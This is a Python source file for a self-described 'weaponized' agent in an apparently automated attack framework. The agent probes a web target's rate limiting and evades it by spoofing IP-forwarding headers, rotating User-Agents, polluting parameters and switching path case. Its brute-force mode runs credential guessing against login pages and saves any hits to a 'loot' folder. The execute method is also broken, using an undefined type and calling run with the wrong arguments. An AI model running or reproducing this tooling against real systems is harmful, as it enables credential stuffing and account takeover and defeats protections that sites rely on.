"""
Weaponized Rate Limit Bypass Agent
โจมตีและ bypass rate limiting mechanisms
"""

import asyncio
import hashlib
import os
import random
import time
from typing import Dict, List, Any

import aiohttp

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class RateLimitAgent(BaseAgent):
    """
    Weaponized Rate Limit Bypass Agent
    
    Features:
    - Rate limit detection
    - Multiple bypass techniques:
      * IP rotation (X-Forwarded-For, X-Real-IP)
      * User-Agent rotation
      * Request timing manipulation
      * Parameter pollution
      * Case sensitivity bypass
      * HTTP method switching
      * Null byte injection
    - Distributed attack simulation
    - Credential stuffing support
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "rate_limit")
        os.makedirs(self.results_dir, exist_ok=True)
        
        # User agents for rotation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        ]
        
        # IP addresses for X-Forwarded-For spoofing
        self.fake_ips = [
            f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"192.168.{random.randint(0,255)}.{random.randint(1,254)}",
            f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        ]

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "test", "bypass", "brute"
            context: {
                "url": target URL,
                "method": HTTP method,
                "data": POST data,
                "max_requests": maximum requests to send,
                "delay": delay between requests (seconds)
            }
        """
        log.info(f"[RateLimitAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="RateLimitAgent",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "test":
                result = await self._test_rate_limit(url, context)
            elif directive == "bypass":
                result = await self._bypass_rate_limit(url, context)
            elif directive == "brute":
                result = await self._brute_force_with_bypass(url, context)
            else:
                result = await self._test_rate_limit(url, context)
            
            return AgentData(
                agent_name="RateLimitAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[RateLimitAgent] Error: {e}")
            return AgentData(
                agent_name="RateLimitAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _test_rate_limit(self, url: str, context: Dict) -> Dict:
        """ทดสอบ rate limiting"""
        log.info(f"[RateLimitAgent] Testing rate limit on {url}...")
        
        method = context.get("method", "GET")
        max_requests = context.get("max_requests", 100)
        
        request_count = 0
        blocked_count = 0
        response_times = []
        
        async with aiohttp.ClientSession() as session:
            for i in range(max_requests):
                start_time = time.time()
                
                try:
                    if method.upper() == "GET":
                        async with session.get(url, timeout=10) as response:
                            status = response.status
                            response_time = time.time() - start_time
                            response_times.append(response_time)
                            
                            if status == 429:  # Too Many Requests
                                blocked_count += 1
                                log.warning(f"[RateLimitAgent] Rate limited at request {i+1}")
                            elif status >= 500:
                                blocked_count += 1
                            
                            request_count += 1
                    
                    elif method.upper() == "POST":
                        data = context.get("data", {})
                        async with session.post(url, data=data, timeout=10) as response:
                            status = response.status
                            response_time = time.time() - start_time
                            response_times.append(response_time)
                            
                            if status == 429:
                                blocked_count += 1
                                log.warning(f"[RateLimitAgent] Rate limited at request {i+1}")
                            elif status >= 500:
                                blocked_count += 1
                            
                            request_count += 1
                
                except Exception as e:
                    log.debug(f"[RateLimitAgent] Request {i+1} failed: {e}")
                    blocked_count += 1
                
                await asyncio.sleep(0.05)  # Small delay
        
        # Analyze results
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        rate_limit_detected = blocked_count > 0
        
        result = {
            "success": True,
            "url": url,
            "total_requests": request_count,
            "blocked_requests": blocked_count,
            "success_rate": (request_count - blocked_count) / request_count if request_count > 0 else 0,
            "avg_response_time": avg_response_time,
            "rate_limit_detected": rate_limit_detected,
            "output_file": self._save_results(url, "test", {
                "total_requests": request_count,
                "blocked_requests": blocked_count,
                "response_times": response_times
            })
        }
        
        if rate_limit_detected:
            log.warning(f"[RateLimitAgent] Rate limiting detected! {blocked_count}/{request_count} requests blocked")
        else:
            log.success(f"[RateLimitAgent] No rate limiting detected")
        
        return result

    async def _bypass_rate_limit(self, url: str, context: Dict) -> Dict:
        """Bypass rate limiting"""
        log.info(f"[RateLimitAgent] Attempting to bypass rate limit...")
        
        method = context.get("method", "GET")
        max_requests = context.get("max_requests", 100)
        
        bypass_techniques = [
            self._bypass_ip_rotation,
            self._bypass_user_agent_rotation,
            self._bypass_parameter_pollution,
            self._bypass_case_sensitivity,
            self._bypass_http_method_switching,
        ]
        
        results = []
        
        for technique in bypass_techniques:
            log.info(f"[RateLimitAgent] Testing {technique.__name__}...")
            
            success_count = 0
            
            for i in range(max_requests):
                headers, modified_url = technique(url, i)
                
                try:
                    async with aiohttp.ClientSession() as session:
                        if method.upper() == "GET":
                            async with session.get(modified_url, headers=headers, timeout=10) as response:
                                if response.status not in [429, 500, 502, 503]:
                                    success_count += 1
                        
                        elif method.upper() == "POST":
                            data = context.get("data", {})
                            async with session.post(modified_url, data=data, headers=headers, timeout=10) as response:
                                if response.status not in [429, 500, 502, 503]:
                                    success_count += 1
                
                except Exception as e:
                    log.debug(f"[RateLimitAgent] Request failed: {e}")
                
                await asyncio.sleep(0.05)
            
            success_rate = success_count / max_requests
            
            results.append({
                "technique": technique.__name__,
                "success_count": success_count,
                "total_requests": max_requests,
                "success_rate": success_rate
            })
            
            if success_rate > 0.8:  # 80% success
                log.success(f"[RateLimitAgent] {technique.__name__} worked! Success rate: {success_rate:.2%}")
        
        # Find best technique
        best_technique = max(results, key=lambda x: x["success_rate"])
        
        result = {
            "success": best_technique["success_rate"] > 0.5,
            "url": url,
            "techniques_tested": results,
            "best_technique": best_technique,
            "output_file": self._save_results(url, "bypass", results)
        }
        
        log.success(f"[RateLimitAgent] Best technique: {best_technique['technique']} ({best_technique['success_rate']:.2%})")
        return result

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute rate limit agent weaponized"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _bypass_ip_rotation(self, url: str, request_num: int) -> tuple:
        """Bypass using IP rotation"""
        fake_ip = random.choice(self.fake_ips)
        headers = {
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Originating-IP": fake_ip,
            "X-Remote-IP": fake_ip,
            "X-Client-IP": fake_ip,
            "User-Agent": random.choice(self.user_agents)
        }
        return headers, url

    def _bypass_user_agent_rotation(self, url: str, request_num: int) -> tuple:
        """Bypass using User-Agent rotation"""
        headers = {
            "User-Agent": random.choice(self.user_agents)
        }
        return headers, url

    def _bypass_parameter_pollution(self, url: str, request_num: int) -> tuple:
        """Bypass using parameter pollution"""
        if "?" in url:
            modified_url = f"{url}&random={random.randint(1000, 9999)}"
        else:
            modified_url = f"{url}?random={random.randint(1000, 9999)}"
        
        headers = {"User-Agent": "Mozilla/5.0"}
        return headers, modified_url

    def _bypass_case_sensitivity(self, url: str, request_num: int) -> tuple:
        """Bypass using case sensitivity"""
        # Randomly change case of URL path
        from urllib.parse import urlparse, urlunparse
        
        parsed = urlparse(url)
        path = parsed.path
        
        # Randomly uppercase some characters
        modified_path = ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in path
        )
        
        modified_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            modified_path,
            parsed.params,
            parsed.query,
            parsed.fragment
        ))
        
        headers = {"User-Agent": "Mozilla/5.0"}
        return headers, modified_url

    def _bypass_http_method_switching(self, url: str, request_num: int) -> tuple:
        """Bypass using HTTP method switching"""
        # This is just header preparation, actual method switching needs to be done in the caller
        headers = {
            "User-Agent": "Mozilla/5.0",
            "X-HTTP-Method-Override": "GET"
        }
        return headers, url

    async def _brute_force_with_bypass(self, url: str, context: Dict) -> Dict:
        """Brute force with rate limit bypass"""
        log.info(f"[RateLimitAgent] Brute forcing with rate limit bypass...")
        
        # Get credentials list
        usernames = context.get("usernames", ["admin", "user", "test"])
        passwords = context.get("passwords", ["password", "123456", "admin"])
        
        found_credentials = []
        total_attempts = 0
        
        for username in usernames:
            for password in passwords:
                # Use IP rotation for each attempt
                headers, _ = self._bypass_ip_rotation(url, total_attempts)
                
                # Try login
                data = {
                    "username": username,
                    "password": password
                }
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(url, data=data, headers=headers, timeout=10) as response:
                            status = response.status
                            content = await response.text()
                            
                            # Check for successful login
                            if status == 200 and "success" in content.lower():
                                found_credentials.append({
                                    "username": username,
                                    "password": password
                                })
                                log.success(f"[RateLimitAgent] Found credentials: {username}:{password}")
                
                except Exception as e:
                    log.debug(f"[RateLimitAgent] Login attempt failed: {e}")
                
                total_attempts += 1
                await asyncio.sleep(0.1)
        
        result = {
            "success": len(found_credentials) > 0,
            "url": url,
            "total_attempts": total_attempts,
            "found_credentials": found_credentials,
            "output_file": self._save_results(url, "brute", found_credentials)
        }
        
        if found_credentials:
            log.success(f"[RateLimitAgent] Found {len(found_credentials)} credentials!")
        else:
            log.warning("[RateLimitAgent] No credentials found")
        
        return result

    def _save_results(self, url: str, operation: str, data: Any) -> str:
        """บันทึกผลลัพธ์"""
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        filename = f"rate_limit_{operation}_{url_hash}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            import json
            with open(filepath, 'w') as f:
                f.write(f"URL: {url}\n")
                f.write(f"Operation: {operation}\n")
                f.write("="*80 + "\n\n")
                f.write(json.dumps(data, indent=2))
            return filepath
        except Exception as e:
            log.error(f"[RateLimitAgent] Failed to save results: {e}")
            return ""

